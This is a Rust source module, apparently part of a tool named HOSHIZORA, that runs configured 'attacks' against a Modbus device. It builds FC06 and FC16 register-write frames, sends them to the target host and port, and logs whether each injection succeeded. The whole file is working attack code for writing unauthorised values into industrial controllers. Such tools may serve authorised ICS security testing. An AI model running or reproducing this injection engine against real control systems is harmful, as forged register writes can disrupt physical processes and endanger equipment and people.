//! HOSHIZORA — HSZR-MBI  |  Injection Engine
//!
//! Executes attack definitions (FC06 / FC16) from AppConfig
//! and returns structured results for the reporter.

use std::thread;
use std::time::Duration;

use serde::Serialize;
use crate::config::{AppConfig, AttackDef};
use crate::modbus;

// ─── Result type ──────────────────────────────────────────────────────────────

#[derive(Debug, Serialize)]
pub struct InjectionResult {
    pub attack_name:   String,
    pub function_code: u8,
    pub target:        String,
    pub success:       bool,
    pub response_hex:  String,
    pub error:         Option<String>,
}

// ─── Per-attack execution ─────────────────────────────────────────────────────

pub fn run_attack(cfg: &AppConfig, attack: &AttackDef) -> InjectionResult {
    let target = format!("{}:{}", cfg.target, cfg.port);

    println!(
        "  ┌─ {} (FC{:02X}) → {}",
        attack.name, attack.fc, target
    );

    // Build frame
    let frame = match attack.fc {
        6 => {
            let reg = attack.register.unwrap_or(1);
            let val = attack.value.unwrap_or(0);
            modbus::build_fc06(cfg.unit_id, reg, val)
        }
        16 => {
            let start  = attack.start_reg.unwrap_or(1);
            let values = attack.values.clone().unwrap_or_default();
            modbus::build_fc16(cfg.unit_id, start, &values)
        }
        other => {
            println!("  └─ [SKIP] Unsupported FC{}", other);
            return InjectionResult {
                attack_name:   attack.name.clone(),
                function_code: other,
                target,
                success:       false,
                response_hex:  String::new(),
                error:         Some(format!("Unsupported FC{}", other)),
            };
        }
    };

    modbus::hexdump("TX", &frame);

    // Send + receive
    match modbus::send_and_recv(&cfg.target, cfg.port, &frame, 2000) {
        Ok(resp) => {
            modbus::hexdump("RX", &resp);
            let hex: String = resp.iter()
                .map(|b| format!("{:02X}", b))
                .collect::<Vec<_>>()
                .join(" ");
            let success = !resp.is_empty() && !modbus::is_exception(&resp);
            if success {
                println!("  └─ [\x1b[32m✓ SUCCESS\x1b[0m]  {}", attack.name);
            } else {
                let exc = resp.get(8).copied().unwrap_or(0);
                println!("  └─ [\x1b[31m✗ EXCEPTION\x1b[0m]  code=0x{:02X}", exc);
            }
            InjectionResult {
                attack_name:   attack.name.clone(),
                function_code: attack.fc,
                target,
                success,
                response_hex:  hex,
                error:         None,
            }
        }
        Err(e) => {
            println!("  └─ [\x1b[31m✗ ERROR\x1b[0m]  {}", e);
            InjectionResult {
                attack_name:   attack.name.clone(),
                function_code: attack.fc,
                target,
                success:       false,
                response_hex:  String::new(),
                error:         Some(e),
            }
        }
    }
}

// ─── Batch execution ──────────────────────────────────────────────────────────

/// Run all (or filtered) attacks from config.
pub fn run_all(cfg: &AppConfig, filter: Option<&str>) -> Vec<InjectionResult> {
    let attacks: Vec<&AttackDef> = match filter {
        Some(f) => cfg.attacks.iter().filter(|a| a.name.to_lowercase().contains(&f.to_lowercase())).collect(),
        None    => cfg.attacks.iter().collect(),
    };

    if attacks.is_empty() {
        eprintln!("[WARN] No attacks matched the given filter.");
        return vec![];
    }

    let mut results = Vec::new();
    for (i, attack) in attacks.iter().enumerate() {
        println!("\n[Attack {}/{}]", i + 1, attacks.len());
        results.push(run_attack(cfg, attack));
        if cfg.delay_ms > 0 && i + 1 < attacks.len() {
            thread::sleep(Duration::from_millis(cfg.delay_ms));
        }
    }
    results
}
